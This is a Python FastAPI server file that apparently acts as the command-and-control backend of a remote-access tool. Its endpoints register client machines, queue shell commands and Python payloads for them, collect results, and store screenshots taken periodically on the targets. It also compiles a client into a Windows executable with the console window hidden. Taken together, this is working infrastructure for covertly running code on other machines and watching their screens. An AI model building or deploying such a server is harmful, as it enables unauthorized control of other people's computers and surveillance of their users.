from typing import Dict, List, Optional
import os
import uuid
import base64
from tinydb import TinyDB, Query
from pydantic import BaseModel
import time

from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
import subprocess
import shutil
import tempfile
import sys
import re

app = FastAPI()

# Enable CORS for local development (frontend running on localhost:3000)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000", "http://127.0.0.1:3000"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# set of raw machine IDs (strings reported by clients)
checked_in_clients: set = set()
# tasks per raw machine_id
tasks_store: Dict[str, List[dict]] = {}
# mapping short numeric IDs (string) -> machine_id
machines_map: Dict[str, str] = {}
# per-client status info (raw machine_id -> status dict)
# status fields: last_seen (float timestamp), sleeping_until (float timestamp or None)
clients_status: Dict[str, Dict[str, Optional[float]]] = {}
# results per machine (machine_id -> list of result dicts)
results_store: Dict[str, List[dict]] = {}
# screenshots per machine (machine_id -> list[dict])
# we keep a list so we can store multiple screenshots per machine
screenshots_store: Dict[str, List[dict]] = {}
# per-machine configuration (e.g. max screenshots to retain)
machine_configs: Dict[str, Dict[str, int]] = {}

# default maximum number of screenshots to keep per machine
DEFAULT_MAX_SCREEN_IMAGES = 20
DEFAULT_MIN_SLEEP = 5
DEFAULT_MAX_SLEEP = 60

# ensure data dir exists and open a TinyDB database for persistent results
DB_PATH = os.path.join(os.path.dirname(__file__), "data")
os.makedirs(DB_PATH, exist_ok=True)
DB_FILE = os.path.join(DB_PATH, "db.json")
db = TinyDB(DB_FILE)
results_table = db.table("results")
payloads_table = db.table("payloads")
machine_configs_table = db.table("machine_configs")
# persistent table for screenshot metadata (pinned flag etc.)
screenshots_table = db.table("screenshots")

# ensure payloads directory for serving files
PAYLOADS_PATH = os.path.join(os.path.dirname(__file__), "payloads")
os.makedirs(PAYLOADS_PATH, exist_ok=True)

# ensure screenshots directory
SCREENSHOTS_PATH = os.path.join(os.path.dirname(__file__), "screenshots")
os.makedirs(SCREENSHOTS_PATH, exist_ok=True)

# builds dir for generated executables
BUILDS_PATH = os.path.join(DB_PATH, 'builds')
os.makedirs(BUILDS_PATH, exist_ok=True)


@app.on_event("startup")
def load_existing_screenshots():
    """On server startup, scan the screenshots directory and populate screenshots_store
    with any PNG files found. This allows the UI to show older screenshots across restarts.
    """
    try:
        for mid in os.listdir(SCREENSHOTS_PATH):
            machine_dir = os.path.join(SCREENSHOTS_PATH, mid)
            if not os.path.isdir(machine_dir):
                continue
            entries = []
            for fname in sorted(os.listdir(machine_dir)):
                if not fname.lower().endswith('.png'):
                    continue
                path = os.path.join(machine_dir, fname)
                try:
                    with open(path, 'rb') as f:
                        data = f.read()
                    img_b64 = base64.b64encode(data).decode('ascii')
                    rec_id = os.path.splitext(fname)[0]
                    ts = os.path.getmtime(path)
                    rec = {"id": rec_id, "task_id": None, "machine_id": mid, "timestamp": ts, "path": path, "image_b64": img_b64}
                    # load pinned flag from DB if present
                    try:
                        q = Query()
                        meta = screenshots_table.search(q.id == rec_id)
                        if meta:
                            rec['pinned'] = bool(meta[0].get('pinned'))
                        else:
                            rec['pinned'] = False
                    except Exception:
                        rec['pinned'] = False
                    entries.append(rec)
                except Exception:
                    continue
            if entries:
                # ensure sorted by timestamp (oldest first)
                entries.sort(key=lambda r: r.get('timestamp', 0))
                screenshots_store[mid] = entries
    except Exception:
        # don't crash startup if filesystem access fails
        pass

    # load persisted machine configs from TinyDB so settings survive restarts
    try:
        for rec in machine_configs_table.all():
            mid = rec.get('machine_id')
            if not mid:
                continue
            machine_configs.setdefault(mid, {})
            if 'max_screen_images' in rec:
                machine_configs[mid]['max_screen_images'] = rec.get('max_screen_images')
            if 'min_sleep' in rec:
                machine_configs[mid]['min_sleep'] = rec.get('min_sleep')
            if 'max_sleep' in rec:
                machine_configs[mid]['max_sleep'] = rec.get('max_sleep')
    except Exception:
        pass


@app.get("/")
def read_root():
    return {"Hello": "World"}


@app.post("/checkin")
def check_in(machine_id: str):
    """Register a reported machine_id (idempotent)."""
    if machine_id in checked_in_clients:
        # if already checked in, return existing short id if assigned
        for sid, mid in machines_map.items():
            if mid == machine_id:
                return {"status": "already checked in", "machine_id": machine_id, "short_id": sid}
        return {"status": "already checked in", "machine_id": machine_id}
    checked_in_clients.add(machine_id)
    # ensure status entry exists and update last_seen
    clients_status.setdefault(machine_id, {})
    clients_status[machine_id]["last_seen"] = time.time()
    # clear sleeping_until when a client explicitly checks in
    clients_status[machine_id]["sleeping_until"] = None
    # auto-assign a short numeric id if one isn't already mapped
    if machine_id not in machines_map.values():
        n = 1
        while str(n) in machines_map:
            n += 1
        machines_map[str(n)] = machine_id
        return {"status": "checked in", "machine_id": machine_id, "short_id": str(n)}
    # if we reach here, the machine_id was already mapped (rare path)
    for sid, mid in machines_map.items():
        if mid == machine_id:
            return {"status": "checked in", "machine_id": machine_id, "short_id": sid}
    return {"status": "checked in", "machine_id": machine_id}


@app.post("/checkout")
def check_out(machine_id: str):
    """Unregister a checked-in client (best-effort)."""
    if machine_id in checked_in_clients:
        checked_in_clients.remove(machine_id)
        # also remove any mapping that points to this machine
        for sid, mid in list(machines_map.items()):
            if mid == machine_id:
                del machines_map[sid]
        # update status to indicate offline
        clients_status.setdefault(machine_id, {})
        clients_status[machine_id]["last_seen"] = time.time()
        clients_status[machine_id]["sleeping_until"] = None
        return {"status": "checked out", "machine_id": machine_id}
    return {"status": "not found", "machine_id": machine_id}


@app.get("/machines")
def list_machines():
    """Return list of raw machine IDs currently checked in."""
    return {"machines": list(checked_in_clients)}


@app.post("/status_update")
def status_update(machine_id: str, sleeping_for: Optional[float] = None):
    """Client reports its upcoming sleep interval or heartbeat.

    - if sleeping_for provided, server records sleeping_until = now + sleeping_for
    - always updates last_seen
    """
    now = time.time()
    if machine_id not in checked_in_clients:
        # If a client reports status but hasn't checked in explicitly, add it
        checked_in_clients.add(machine_id)
    clients_status.setdefault(machine_id, {})
    clients_status[machine_id]["last_seen"] = now
    if sleeping_for is not None:
        try:
            sf = float(sleeping_for)
            clients_status[machine_id]["sleeping_until"] = now + sf
        except Exception:
            clients_status[machine_id]["sleeping_until"] = None
    else:
        # clear sleeping_until if not provided
        clients_status[machine_id]["sleeping_until"] = None

    # mark if there are any pending tasks for convenience
    clients_status[machine_id]["has_task"] = bool(tasks_store.get(machine_id))

    # if the controller has requested periodic screenshots for this machine,
    # when the client reports a sleep interval we may ask it to take a screenshot
    # after waking. Return a small boolean to instruct the client.
    screenshot_after_sleep = False
    if sleeping_for is not None:
        if clients_status[machine_id].get("periodic_screenshots"):
            screenshot_after_sleep = True

    return {"status": "updated", "machine_id": machine_id, "status_info": clients_status[machine_id], "screenshot_after_sleep": screenshot_after_sleep}


@app.get("/clients_status")
def get_clients_status():
    """Return the mapping of raw machine_id -> status info (last_seen, sleeping_until, has_task)."""
    # generate a shallow copy with JSON-friendly values
    now = time.time()
    out = {}
    for m, s in clients_status.items():
        last_seen = s.get("last_seen")
        sleeping_until = s.get("sleeping_until")
        has_task = s.get("has_task", False) or bool(tasks_store.get(m))
        # expose seconds until wake if sleeping_until is present
        secs_until = None
        if sleeping_until is not None and sleeping_until > now:
            secs_until = int(sleeping_until - now)
        out[m] = {"last_seen": last_seen, "sleeping_until": sleeping_until, "secs_until": secs_until, "has_task": has_task, "periodic_screenshots": bool(s.get("periodic_screenshots", False))}
    return {"clients_status": out}


@app.get("/mapped")
def list_mapped():
    """Return the short-ID -> machine_id mapping."""
    return {"mapping": machines_map}


@app.post("/assign_id")
def assign_id(machine_id: str, short_id: Optional[str] = None):
    """Assign a short numeric id to a machine. If short_id is omitted, auto-pick the next available integer."""
    if machine_id not in checked_in_clients:
        return {"status": "machine not checked in", "machine_id": machine_id}
    if short_id is None:
        # pick next available positive integer starting at 1
        n = 1
        while str(n) in machines_map:
            n += 1
        short_id = str(n)
    else:
        short_id = str(short_id)
        # ensure short_id not already used for a different machine
        if short_id in machines_map and machines_map[short_id] != machine_id:
            return {"status": "short_id_conflict", "short_id": short_id}
    machines_map[short_id] = machine_id
    return {"status": "assigned", "short_id": short_id, "machine_id": machine_id}


def _resolve_target(machine_id: Optional[str], short_id: Optional[str]) -> Optional[str]:
    """Resolve provided machine_id or short_id to a raw machine_id string. Returns None if not found."""
    if machine_id:
        return machine_id
    if short_id:
        return machines_map.get(str(short_id))
    return None


@app.post("/addtask")
def add_task(task_id: str, task_type: str, machine_id: Optional[str] = None, short_id: Optional[str] = None, command: str = None, script: str = None):
    """Add a task (CMD or SCRIPT) for a machine referenced either by `machine_id` or `short_id`."""
    target = _resolve_target(machine_id, short_id)
    if not target:
        return {"status": "target_not_found", "machine_id": machine_id, "short_id": short_id}
    t = {"task_id": task_id, "type": task_type.upper()}
    if task_type.upper() == "CMD":
        t["command"] = command or ""
    elif task_type.upper() in ("PY", "PAYLOAD"):
        # payload_name expected in `command` parameter (legacy reuse), or script param
        payload_name = command or script or None
        t["payload_name"] = payload_name or ""
    else:
        t["script"] = script or ""
    tasks_store.setdefault(target, []).append(t)
    return {"status": "task added", "task": t}


class UploadPayload(BaseModel):
    file_name: str
    content: str


@app.post("/upload_payload")
def upload_payload(payload: UploadPayload):
    """Upload a payload (Python file) to server storage and register in DB.

    Stores file under ./payloads/<file_name> and records metadata in TinyDB table 'payloads'.
    """
    # sanitize file name a bit
    safe_name = os.path.basename(payload.file_name)
    if not safe_name.endswith(".py"):
        # enforce python suffix
        safe_name = safe_name + ".py"
    path = os.path.join(PAYLOADS_PATH, safe_name)
    with open(path, "w", encoding="utf-8") as f:
        f.write(payload.content)

    rec = {"id": str(uuid.uuid4()), "file_name": safe_name, "path": path, "timestamp": time.time()}
    payloads_table.insert(rec)

    return {"status": "uploaded", "payload": rec}


@app.get("/payloads")
def list_payloads():
    """Return list of registered payloads."""
    return {"payloads": payloads_table.all()}


@app.get("/payload")
def get_payload(file_name: str):
    """Return content of the payload by file_name (exact base name)."""
    safe_name = os.path.basename(file_name)
    path = os.path.join(PAYLOADS_PATH, safe_name)
    if not os.path.exists(path):
        return {"content": None}
    with open(path, "r", encoding="utf-8") as f:
        return {"content": f.read(), "file_name": safe_name}


class UploadScreenshot(BaseModel):
    machine_id: str
    task_id: Optional[str]
    image_b64: str


@app.post("/upload_screenshot")
def upload_screenshot(payload: UploadScreenshot):
    """Accept a base64-encoded PNG screenshot from a client and store it as the latest screenshot for that machine."""
    mid = payload.machine_id
    tid = payload.task_id
    b64 = payload.image_b64
    now = time.time()
    rec_id = str(uuid.uuid4())
    # save to disk
    try:
        import base64
        data = base64.b64decode(b64)
        # save per-machine folder so screenshots are grouped by machine
        machine_dir = os.path.join(SCREENSHOTS_PATH, mid)
        os.makedirs(machine_dir, exist_ok=True)
        path = os.path.join(machine_dir, f"{rec_id}.png")
        with open(path, "wb") as f:
            f.write(data)
    except Exception as e:
        return {"status": "error", "reason": str(e)}

    rec = {"id": rec_id, "task_id": tid, "machine_id": mid, "timestamp": now, "path": path, "image_b64": b64, "pinned": False}
    screenshots_store.setdefault(mid, []).append(rec)
    # persist metadata to TinyDB so 'pinned' survives restarts
    try:
        q = Query()
        screenshots_table.upsert({"id": rec_id, "machine_id": mid, "path": path, "timestamp": now, "pinned": False}, q.id == rec_id)
    except Exception:
        pass

    # enforce per-machine retention policy (prune oldest screenshots when over limit)
    cfg = machine_configs.get(mid, {})
    limit = cfg.get('max_screen_images', DEFAULT_MAX_SCREEN_IMAGES)
    lst = screenshots_store.get(mid, [])
    if limit is not None and len(lst) > limit:
        # Prefer to keep pinned screenshots. Remove oldest non-pinned entries first.
        remove_count = len(lst) - limit
        # sort by timestamp ascending (oldest first)
        sorted_by_time = sorted(lst, key=lambda r: r.get('timestamp', 0))
        non_pinned = [r for r in sorted_by_time if not r.get('pinned')]
        to_remove = non_pinned[:remove_count]
        # If there aren't enough non-pinned to remove, we'll remove what we can and leave pinned ones.
        remaining = [r for r in sorted_by_time if r not in to_remove]
        # delete files for removed screenshots
        for r in to_remove:
            try:
                p = r.get('path')
                if p and os.path.exists(p):
                    os.remove(p)
            except Exception:
                pass
            try:
                q = Query()
                screenshots_table.remove(q.id == r.get('id'))
            except Exception:
                pass
        # preserve original append order (most recent last)
        screenshots_store[mid] = remaining
    return {"status": "uploaded", "screenshot": {"id": rec_id, "timestamp": now}}


@app.get("/screenshot")
def get_screenshot(machine_id: str):
    """Return the latest screenshot for a machine (if any)."""
    lst = screenshots_store.get(machine_id) or []
    if not lst:
        return {"screenshot": None}
    # latest is the last appended
    rec = lst[-1]
    return {"screenshot": {"id": rec.get("id"), "task_id": rec.get("task_id"), "machine_id": rec.get("machine_id"), "timestamp": rec.get("timestamp"), "image_b64": rec.get("image_b64")}}


@app.get("/screenshots")
def list_screenshots(machine_id: str):
    """Return list of stored screenshots metadata for a machine (most recent last)."""
    lst = screenshots_store.get(machine_id) or []
    # return metadata including the base64 image so the UI can render thumbnails
    out = [{"id": r.get("id"), "task_id": r.get("task_id"), "timestamp": r.get("timestamp"), "path": r.get("path"), "image_b64": r.get('image_b64'), "pinned": bool(r.get('pinned'))} for r in lst]
    return {"screenshots": out}


@app.delete("/screenshot")
def delete_screenshot(id: str):
    """Delete a screenshot by its unique id from memory and disk."""
    found = None
    found_mid = None
    for mid, lst in list(screenshots_store.items()):
        for r in lst:
            if r.get('id') == id:
                found = r
                found_mid = mid
                break
        if found:
            break
    if not found:
        return {"deleted": False, "reason": "not_found"}
    # do not allow deleting a pinned screenshot
    if found.get('pinned'):
        return {"deleted": False, "reason": "pinned"}
    # remove file if present
    try:
        p = found.get('path')
        if p and os.path.exists(p):
            os.remove(p)
    except Exception:
        pass
    # remove from in-memory list
    if found_mid:
        screenshots_store[found_mid] = [r for r in screenshots_store.get(found_mid, []) if r.get('id') != id]
        if not screenshots_store[found_mid]:
            del screenshots_store[found_mid]
    try:
        q = Query()
        screenshots_table.remove(q.id == id)
    except Exception:
        pass
    return {"deleted": True, "id": id}


@app.post("/toggle_periodic_screenshots")
def toggle_periodic_screenshots(machine_id: str, enabled: bool = True):
    """Controller API to enable/disable periodic screenshots for a given machine.

    When enabled, the server will instruct clients (via the `status_update` response)
    to take a screenshot after their next sleep interval.
    """
    if machine_id not in clients_status:
        clients_status.setdefault(machine_id, {})
    clients_status[machine_id]["periodic_screenshots"] = bool(enabled)
    return {"status": "ok", "machine_id": machine_id, "periodic_screenshots": clients_status[machine_id]["periodic_screenshots"]}


@app.post("/screenshot_pin")
def screenshot_pin(id: str, pinned: bool = True):
    """Set or clear the 'pinned' flag for a screenshot. Pinned screenshots won't be pruned or deleted."""
    found = None
    found_mid = None
    for mid, lst in screenshots_store.items():
        for r in lst:
            if r.get('id') == id:
                found = r
                found_mid = mid
                break
        if found:
            break
    if not found:
        return {"status": "not_found", "id": id}
    try:
        found['pinned'] = bool(pinned)
        # reflect change in the store
        if found_mid:
            screenshots_store[found_mid] = [r if r.get('id') != id else found for r in screenshots_store.get(found_mid, [])]
        # persist change to TinyDB
        try:
            q = Query()
            screenshots_table.upsert({"id": id, "machine_id": found_mid, "path": found.get('path'), "timestamp": found.get('timestamp'), "pinned": found['pinned']}, q.id == id)
        except Exception:
            pass
        return {"status": "ok", "id": id, "pinned": found['pinned']}
    except Exception:
        return {"status": "error", "id": id}


class MachineConfig(BaseModel):
    machine_id: str
    max_screen_images: Optional[int] = None
    min_sleep: Optional[float] = None
    max_sleep: Optional[float] = None


@app.post("/set_machine_config")
def set_machine_config(cfg: MachineConfig):
    """Set per-machine configuration such as `max_screen_images`.

    If `max_screen_images` is None the setting is left unchanged.
    """
    mid = cfg.machine_id
    machine_configs.setdefault(mid, {})
    updated = False
    # update in-memory config
    if cfg.max_screen_images is not None:
        try:
            val = int(cfg.max_screen_images)
            machine_configs[mid]['max_screen_images'] = max(0, val)
            updated = True
        except Exception:
            pass
    if cfg.min_sleep is not None:
        try:
            ms = float(cfg.min_sleep)
            machine_configs[mid]['min_sleep'] = max(0.0, ms)
            updated = True
        except Exception:
            pass
    if cfg.max_sleep is not None:
        try:
            ms = float(cfg.max_sleep)
            machine_configs[mid]['max_sleep'] = max(0.0, ms)
            updated = True
        except Exception:
            pass

    # persist to TinyDB (merge with existing record)
    try:
        q = Query()
        existing = machine_configs_table.search(q.machine_id == mid)
        rec = existing[0] if existing else {"machine_id": mid}
        # merge values
        if 'max_screen_images' in machine_configs[mid]:
            rec['max_screen_images'] = machine_configs[mid]['max_screen_images']
        if 'min_sleep' in machine_configs[mid]:
            rec['min_sleep'] = machine_configs[mid]['min_sleep']
        if 'max_sleep' in machine_configs[mid]:
            rec['max_sleep'] = machine_configs[mid]['max_sleep']
        machine_configs_table.upsert(rec, q.machine_id == mid)
    except Exception:
        pass

    return {"status": "ok", "machine_id": mid, "config": machine_configs.get(mid, {})}


@app.get("/machine_config")
def get_machine_config(machine_id: str):
    """Return current per-machine config (with defaults applied)."""
    cfg = machine_configs.get(machine_id, {})
    return {"machine_id": machine_id, "config": {"max_screen_images": cfg.get('max_screen_images', DEFAULT_MAX_SCREEN_IMAGES), "min_sleep": cfg.get('min_sleep', DEFAULT_MIN_SLEEP), "max_sleep": cfg.get('max_sleep', DEFAULT_MAX_SLEEP)}}


@app.get("/tasks")
def get_tasks(machine_id: Optional[str] = None, short_id: Optional[str] = None):
    """Return pending tasks for a machine (by raw machine_id or short_id)."""
    target = _resolve_target(machine_id, short_id)
    if not target:
        return {"tasks": []}
    tasks = tasks_store.get(target, [])
    # Suggest a client-side sleep interval — shorter when there are tasks, longer when idle.
    # This helps reduce client polling frequency for large fleets.
    if tasks:
        recommended_sleep = 5
    else:
        # When no tasks are available, recommend a longer sleep so clients back off
        recommended_sleep = 60
    return {"tasks": tasks, "recommended_sleep": recommended_sleep}


@app.get("/tasks_count")
def tasks_count():
    """Return a lightweight total number of pending tasks across all machines.

    This avoids the UI making an individual /tasks call per machine when all we
    need is a single numeric count for the dashboard.
    """
    total = 0
    for lst in tasks_store.values():
        total += len(lst or [])
    return {"count": total}


class SubmitResult(BaseModel):
    task_id: str
    result: str
    machine_id: Optional[str] = None
    short_id: Optional[str] = None


@app.post("/submittask")
def submit_task(payload: SubmitResult):
    """Accept a finished task result in the request body and remove the task from the queue.

    Stores the result in-memory (results_store) so controllers can retrieve it later.
    """
    task_id = payload.task_id
    result = payload.result
    machine_id = payload.machine_id
    short_id = payload.short_id

    target = _resolve_target(machine_id, short_id)
    if not target:
        return {"status": "target_not_found", "task_id": task_id}

    removed = False
    tasks = tasks_store.get(target, [])
    for t in list(tasks):
        if t.get("task_id") == task_id:
            tasks.remove(t)
            removed = True

    # store result persistently and in-memory for convenience
    rec = {"id": str(uuid.uuid4()), "task_id": task_id, "result": result, "machine_id": target, "timestamp": time.time()}
    results_table.insert(rec)
    results_store.setdefault(target, []).append(rec)

    if removed:
        return {"status": "task submitted and removed", "task_id": task_id, "stored": True}
    return {"status": "task submitted (was not in queue)", "task_id": task_id, "stored": True}


@app.get("/results")
def get_results(machine_id: Optional[str] = None, short_id: Optional[str] = None):
    """Return stored results for a machine (by raw machine_id or short_id)."""
    target = _resolve_target(machine_id, short_id)
    if not target:
        return {"results": []}
    # try to read from TinyDB table for persistence
    q = Query()
    found = results_table.search(q.machine_id == target)
    # merge any in-memory results that might not yet be in TinyDB (unlikely)
    mem = results_store.get(target, [])
    # avoid duplicates by id (prefers DB records)
    all_ids = {r.get("id") for r in found}
    merged = found + [r for r in mem if r.get("id") not in all_ids]
    return {"results": merged}


@app.get("/result")
def get_result(id: str):
    """Fetch a single stored result by its unique id."""
    q = Query()
    found = results_table.search(q.id == id)
    if not found:
        return {"result": None}
    return {"result": found[0]}


@app.get("/results_all")
def get_results_all():
    """Return all stored results from DB."""
    return {"results": results_table.all()}


@app.get("/db_stats")
def db_stats():
    """Return lightweight statistics about the tinydb results table."""
    count = len(results_table)
    return {"count": count, "db_file": DB_FILE}


@app.post("/build_client")
def build_client(server_url: Optional[str] = None, onefile: bool = True, console: bool = False):
    """Build the Python `client.py` into a Windows executable using PyInstaller.

    - `server_url` (optional): if provided, it will be injected into the built client as `SERVER_URL`.
    - `onefile` (bool): whether to build a single-file executable (default: true).
    - `console` (bool): whether to keep the console window (default: false).

    Returns a direct file response with the built exe on success, or JSON with error/info on failure.
    """
    # prepare build workspace
    build_id = str(uuid.uuid4())
    build_dir = os.path.join(BUILDS_PATH, build_id)
    os.makedirs(build_dir, exist_ok=True)
    try:
        # read original client.py
        src_path = os.path.join(os.path.dirname(__file__), 'client.py')
        if not os.path.exists(src_path):
            return {"status": "error", "reason": "client.py not found on server"}
        with open(src_path, 'r', encoding='utf-8') as f:
            src = f.read()

        # inject server_url if provided
        if server_url:
            su = server_url
            if not su.endswith('/'):
                su = su + '/'
            # replace a simple SERVER_URL assignment line
            src = re.sub(r'SERVER_URL\s*=\s*".*?"', f'SERVER_URL = "{su}"', src)

        # write working client file
        work_py = os.path.join(build_dir, 'client_build.py')
        with open(work_py, 'w', encoding='utf-8') as f:
            f.write(src)

        # prepare pyinstaller paths
        distdir = os.path.join(build_dir, 'dist')
        workpath = os.path.join(build_dir, 'build')
        specpath = os.path.join(build_dir, 'spec')
        os.makedirs(distdir, exist_ok=True)
        os.makedirs(workpath, exist_ok=True)
        os.makedirs(specpath, exist_ok=True)

        # build command: use current python to run PyInstaller module
        cmd = [sys.executable, '-m', 'PyInstaller']
        if onefile:
            cmd.append('--onefile')
        if not console:
            cmd.append('--noconsole')
        cmd.extend(['--noconfirm', f'--distpath={distdir}', f'--workpath={workpath}', f'--specpath={specpath}', work_py])

        # run PyInstaller
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=900)
        if proc.returncode != 0:
            return {"status": "error", "reason": "build_failed", "log": proc.stdout}

        # find resulting executable
        exe_files = [fn for fn in os.listdir(distdir) if fn.lower().endswith('.exe') or fn.lower().endswith('.bin') or fn.lower().endswith('.exe')]
        if not exe_files:
            # include log to help debugging
            return {"status": "error", "reason": "no_exe_found", "log": proc.stdout}
        exe_name = exe_files[0]
        exe_path = os.path.join(distdir, exe_name)

        # return file response for download
        return FileResponse(exe_path, media_type='application/octet-stream', filename=exe_name)

    except subprocess.TimeoutExpired:
        return {"status": "error", "reason": "build_timeout"}
    except Exception as e:
        return {"status": "error", "reason": str(e)}


@app.delete("/result")
def delete_result(id: str):
    """Delete a stored result by id from TinyDB and in-memory store."""
    q = Query()
    found = results_table.search(q.id == id)
    if not found:
        return {"deleted": False, "reason": "not_found"}
    # remove from TinyDB
    results_table.remove(q.id == id)
    # also remove from in-memory results_store
    for k, lst in list(results_store.items()):
        results_store[k] = [r for r in lst if r.get("id") != id]
        if not results_store[k]:
            del results_store[k]
    return {"deleted": True, "id": id}